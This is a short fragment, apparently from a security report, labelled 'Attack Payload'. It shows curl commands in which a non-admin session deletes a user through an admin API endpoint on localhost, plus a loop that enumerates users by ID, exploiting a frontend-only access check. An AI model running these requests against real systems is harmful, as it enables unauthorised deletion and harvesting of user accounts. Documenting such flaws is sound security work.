**Attack Payload**:
```bash
# Non-admin user directly calls admin endpoint, bypassing frontend check
curl -X DELETE http://localhost:8080/api/admin/users/1 \
  -H "Cookie: session=non_admin_user_session"

# Or enumerate all users by iterating IDs
for i in $(seq 1 1000); do
  curl -s http://localhost:8080/api/admin/users/$i
done
